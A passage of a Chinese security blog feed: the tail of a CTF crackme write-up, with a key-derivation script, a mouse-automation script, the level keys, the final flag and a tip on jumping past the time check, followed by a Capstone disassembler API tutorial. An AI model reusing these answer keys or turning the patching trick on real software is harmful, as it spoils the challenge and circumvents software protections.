class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    pos1 = <span class="number">0</span></span><br><span class="line">    pos2 = <span class="number">0</span></span><br><span class="line">    pos3 = <span class="number">0</span></span><br><span class="line">    pos4 = <span class="number">0</span></span><br><span class="line">    choice = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a1)):</span><br><span class="line">        pos1 += a1[i]</span><br><span class="line">        pos2 += a2[i]</span><br><span class="line">        pos3 += a3[i]</span><br><span class="line">        <span class="keyword">if</span> (pos4 + <span class="number">4</span> != pos1) <span class="keyword">and</span> (pos4 + <span class="number">4</span> != pos2) <span class="keyword">and</span> (pos4 + <span class="number">4</span> != pos3):</span><br><span class="line">            t = <span class="number">4</span></span><br><span class="line">        <span class="keyword">elif</span> (pos4 + <span class="number">3</span> != pos1) <span class="keyword">and</span> (pos4 + <span class="number">3</span> != pos2) <span class="keyword">and</span> (pos4 + <span class="number">3</span> != pos3):</span><br><span class="line">            t = <span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> (pos4 + <span class="number">2</span> != pos1) <span class="keyword">and</span> (pos4 + <span class="number">2</span> != pos2) <span class="keyword">and</span> (pos4 + <span class="number">2</span> != pos3):</span><br><span class="line">            t = <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t = <span class="number">1</span></span><br><span class="line">        pos4 += t</span><br><span class="line">        choice.append(t<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> choice</span><br><span class="line"></span><br><span class="line">    b64 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> choice</span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(choice),<span class="number">3</span>):</span><br><span class="line">        t = (choice[i]&lt;&lt;<span class="number">4</span>) + (choice[i+<span class="number">1</span>]&lt;&lt;<span class="number">2</span>) + choice[i+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">print</span> t,</span><br><span class="line">        ans+=b64[t]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> ans</span><br><span class="line">    <span class="keyword">print</span> b64decode(ans)</span><br><span class="line"></span><br><span class="line"><span class="comment"># level1 1d2e3c4a</span></span><br><span class="line">level2()    <span class="comment"># efbe3323adde6666feca1313beba1414</span></span><br><span class="line"><span class="comment"># level3 0acb7935481efc12</span></span><br><span class="line">level4()    <span class="comment"># 21d03c42f365901cff</span></span><br></pre></td></tr></table></figure></p><p>程序输入有时间限制，可以找到时间call直接jmp，也可以鼠标模拟</p><p>鼠标点击模拟脚本<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pymouse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">m = PyMouse()</span><br><span class="line"></span><br><span class="line">k1 = <span class="string">"1d2e3c4a"</span></span><br><span class="line">key1 = list(k1)</span><br><span class="line">k2 = <span class="string">"efbe3323adde6666feca1313beba1414"</span></span><br><span class="line">key2 = list(k2)</span><br><span class="line">k3 = <span class="string">"0acb7935481efc12"</span></span><br><span class="line">key3 = list(k3)</span><br><span class="line">k4 = <span class="string">"21d03c42f365901cff"</span></span><br><span class="line">key4 = list(k4)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mnclick</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(y):</span><br><span class="line">        <span class="keyword">if</span>(x[i] == <span class="string">'0'</span>): m.click(<span class="number">1075</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'1'</span>): m.click(<span class="number">1118</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'2'</span>): m.click(<span class="number">1162</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'3'</span>): m.click(<span class="number">1205</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'4'</span>): m.click(<span class="number">1075</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'5'</span>): m.click(<span class="number">1118</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'6'</span>): m.click(<span class="number">1162</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'7'</span>): m.click(<span class="number">1205</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'8'</span>): m.click(<span class="number">1075</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'9'</span>): m.click(<span class="number">1118</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'a'</span>): m.click(<span class="number">1162</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'b'</span>): m.click(<span class="number">1205</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'c'</span>): m.click(<span class="number">1075</span>, <span class="number">558</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'d'</span>): m.click(<span class="number">1118</span>, <span class="number">558</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'e'</span>): m.click(<span class="number">1162</span>, <span class="number">558</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'f'</span>): m.click(<span class="number">1205</span>, <span class="number">558</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    m.click(<span class="number">670</span>, <span class="number">624</span>)</span><br><span class="line"></span><br><span class="line">mnclick(key1, <span class="number">8</span>)</span><br><span class="line">mnclick(key2, <span class="number">32</span>)</span><br><span class="line">mnclick(key3, <span class="number">16</span>)</span><br><span class="line">mnclick(key4, <span class="number">18</span>)</span><br></pre></td></tr></table></figure></p><p>按钮位置是用spy++查看窗口属性看到的</p><p>最后   flag{N0t_d1ff1cul7_r1ght?_3d34e}</p><p>From <a href="https://kabeor.github.io/2018护网杯线上 APM233/">https://kabeor.github.io/2018护网杯线上 APM233/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2018护网杯线上-APM233&quot;&gt;&lt;a href=&quot;#2018护网杯线上-APM233&quot; class=&quot;headerlink&quot; title=&quot;2018护网杯线上 APM233&quot;&gt;&lt;/a&gt;2018护网杯线上 APM233&lt;/h1&gt;&lt;p&gt;MFC42的逆向&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(四)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E5%9B%9B)/"/>
    <id>https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(四)/</id>
    <published>2019-07-27T02:19:05.676Z</published>
    <updated>2019-08-14T04:49:51.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-四"><a href="#Capstone反汇编引擎数据类型及API分析及示例-四" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(四)"></a>Capstone反汇编引擎数据类型及API分析及示例(四)</h1><h2 id="API分析"><a href="#API分析" class="headerlink" title="API分析"></a>API分析</h2><h3 id="cs-free"><a href="#cs-free" class="headerlink" title="cs_free"></a>cs_free</h3><p><code>void CAPSTONE_API cs_free(cs_insn *insn, size_t count);</code></p><p>释放被cs_malloc() 或 cs_disasm()分配的内存(insn参数)<br>参数<br>insn: 由cs_disasm()或cs_malloc()中的@insn参数返回的指针<br>count: 赋值由cs_disasm()返回的cs_insn结构的数量，或赋值为1表示由cs_malloc()分配给空闲内存的数量</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3bf583b748d86745.jpg" alt><br>直接调用cs_mem_free,也就是默认的free</p><p>示例(释放cs_disasm申请的内存)，代码片段：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);           <span class="comment">//计数由cs_disasm申请的内存</span></span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);   <span class="comment">//循环依次释放每条insn的内存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cs-malloc"><a href="#cs-malloc" class="headerlink" title="cs_malloc"></a>cs_malloc</h3><p><code>cs_insn * CAPSTONE_API cs_malloc(csh handle);</code></p><p>被用于在API cs_disasm_iter()中为一条指令分配内存</p><p>参数<br>handle: cs_open()返回的句柄</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3bf97c0299d21615.jpg" alt></p><p>当这条指令所占的内存不再使用时，使用cs_free(insn, 1)释放，示例在下面cs_disasm_iter处</p><h3 id="cs-disasm-iter"><a href="#cs-disasm-iter" class="headerlink" title="cs_disasm_iter"></a>cs_disasm_iter</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> CAPSTONE_API <span class="title">cs_disasm_iter</span><span class="params">(csh handle,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">uint8_t</span> **code, <span class="keyword">size_t</span> *size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">uint64_t</span> *address, cs_insn *insn)</span></span>;</span><br></pre></td></tr></table></figure><p>给定buff、大小、地址和要解码的指令数，更快速的反汇编机器码，<br>这个API将生成的指令放入insn中的给定的缓存中。</p><p>注意1: 此API将更新code、size和address以指向输入缓冲区中的下一条指令。所以，虽然每次反汇编一条指令可以使用cs_disasm(count=1)来实现，但一些基准测试显示，在循环中使用cs_disasm_iter()可以方便地快速迭代所有指令，在随机输入时可以快30%。</p><p>注意2:可以使用cs_malloc()创建insn中的缓存。</p><p>注意3:对于动态分配内存可能产生内存不足的系统(比如OS内核或固件)，建议使用cs_disasm()这个API, 因为cs_disasm()是根据要分解的指令的数量来分配内存。</p><p>参数<br>handle: cs_open()返回的句柄<br>code: 要反汇编的机器码所在的缓冲区<br>size: 机器码缓冲区的大小<br>address: 所给机器码缓冲区中第一个insn的地址<br>insn: 指向这个API要填充的指令的指针。<br>return:如果这个API成功反汇编了一条指令返回true，否则将返回false。</p><p>失败时，调用cs_errno()获取错误代码。</p><p>代码实现，在cs_disasm基础上使用动态内存分配</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> CAPSTONE_API <span class="title">cs_disasm_iter</span><span class="params">(csh ud, <span class="keyword">const</span> <span class="keyword">uint8_t</span> **code, <span class="keyword">size_t</span> *size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">uint64_t</span> *address, cs_insn *insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"><span class="keyword">uint16_t</span> insn_size;</span><br><span class="line">MCInst mci;</span><br><span class="line"><span class="keyword">bool</span> r;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"><span class="keyword">if</span> (!handle) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line">MCInst_Init(&amp;mci);</span><br><span class="line">mci.csh = handle;</span><br><span class="line"></span><br><span class="line">mci.address = *address;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为无detail模式保存相关信息</span></span><br><span class="line">mci.flat_insn = insn;</span><br><span class="line">mci.flat_insn-&gt;address = *address;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line">mci.flat_insn-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">mci.flat_insn-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">r = handle-&gt;disasm(ud, *code, *size, &amp;mci, &amp;insn_size, *address, handle-&gt;getinsn_info);</span><br><span class="line"><span class="keyword">if</span> (r) &#123;</span><br><span class="line">SStream ss;</span><br><span class="line">SStream_Init(&amp;ss);</span><br><span class="line"></span><br><span class="line">mci.flat_insn-&gt;size = insn_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将内部指令操作码映射到公共insn ID</span></span><br><span class="line">handle-&gt;insn_id(handle, insn, mci.Opcode);</span><br><span class="line"></span><br><span class="line">handle-&gt;printer(&amp;mci, &amp;ss, handle-&gt;printer_info);</span><br><span class="line"></span><br><span class="line">fill_insn(handle, insn, ss.buffer, &amp;mci, handle-&gt;post_printer, *code);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调整伪操作码(X86)</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;arch == CS_ARCH_X86)</span><br><span class="line">insn-&gt;id += mci.popcode_adjust;</span><br><span class="line"></span><br><span class="line">*code += insn_size;</span><br><span class="line">*size -= insn_size;</span><br><span class="line">*address += insn_size;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 遇到中断指令</span></span><br><span class="line"><span class="keyword">size_t</span> skipdata_bytes;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果没有跳过数据的请求，或者剩余数据太小，则退出</span></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;skipdata || handle-&gt;skipdata_size &gt; *size)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata_setup.callback) &#123;</span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_setup.callback(*code, *size,</span><br><span class="line"><span class="number">0</span>, handle-&gt;skipdata_setup.user_data);</span><br><span class="line"><span class="keyword">if</span> (skipdata_bytes &gt; *size)</span><br><span class="line"><span class="comment">// 剩余数据太小</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!skipdata_bytes)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基于架构和模式跳过一些数据</span></span><br><span class="line">insn-&gt;id = <span class="number">0</span>;<span class="comment">// 此“数据”指令的ID无效</span></span><br><span class="line">insn-&gt;address = *address;</span><br><span class="line">insn-&gt;size = (<span class="keyword">uint16_t</span>)skipdata_bytes;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line">insn-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">insn-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="built_in">memcpy</span>(insn-&gt;bytes, *code, skipdata_bytes);</span><br><span class="line"><span class="built_in">strncpy</span>(insn-&gt;mnemonic, handle-&gt;skipdata_setup.mnemonic,</span><br><span class="line"><span class="keyword">sizeof</span>(insn-&gt;mnemonic) - <span class="number">1</span>);</span><br><span class="line">skipdata_opstr(insn-&gt;op_str, *code, skipdata_bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">*code += skipdata_bytes;</span><br><span class="line">*size -= skipdata_bytes;</span><br><span class="line">*address += skipdata_bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE16 <span class="meta-string">"\x8d\x4c\x32\x08\x01\xd8\x81\xc6\x34\x12\x00\x00"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x8d\x4c\x32\x08\x01\xd8\x81\xc6\x34\x12\x00\x00"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[4] = &#123;</span>     <span class="comment">//架构及模式</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_16,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE16,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 16bit (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32bit (ATT syntax)"</span>,</span><br><span class="line">CS_OPT_SYNTAX,</span><br><span class="line">CS_OPT_SYNTAX_ATT,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为cs_disasm_iter()分配内存</span></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);   <span class="comment">//原机器码</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;   <span class="comment">//cs_disasm_iter反汇编</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s // insn-ID: %u, insn-mnem: %s\n"</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str,</span><br><span class="line">insn-&gt;id, cs_insn_name(handle, insn-&gt;id));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印此指令使用的隐式寄存器</span></span><br><span class="line">detail = insn-&gt;detail;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (detail-&gt;regs_read_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tImplicit registers read: "</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; detail-&gt;regs_read_count; n++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, cs_reg_name(handle, detail-&gt;regs_read[n]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印此指令修改的隐式寄存器</span></span><br><span class="line"><span class="keyword">if</span> (detail-&gt;regs_write_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tImplicit registers modified: "</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; detail-&gt;regs_write_count; n++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, cs_reg_name(handle, detail-&gt;regs_write[n]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印此指令所属指令集</span></span><br><span class="line"><span class="keyword">if</span> (detail-&gt;groups_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tThis instruction belongs to groups: "</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; detail-&gt;groups_count; n++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, cs_group_name(handle, detail-&gt;groups[n]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放cs_malloc()分配的内存</span></span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c063cd33b421225.jpg" alt></p><h3 id="cs-reg-name"><a href="#cs-reg-name" class="headerlink" title="cs_reg_name"></a>cs_reg_name</h3><p><code>const char * CAPSTONE_API cs_reg_name(csh handle, unsigned int reg_id);</code></p><p>获取寄存器的名字(string类型)<br>寄存器id可在相关架构的头文件(建立项目时复制到项目文件夹的那些头文件)内找到</p><p>注意： 当处于diet模式时此API不可用，因为引擎不会存储寄存器名</p><p>参数<br>handle: cs_open()返回的句柄<br>reg_id: 寄存器id<br>return: 寄存器的字符名, 如果reg_id不可用返回NULL</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3c0dcfa15c265034.jpg" alt></p><p>示例(打印RAX)：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, cs_reg_name(handle, X86_REG_RAX));</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span 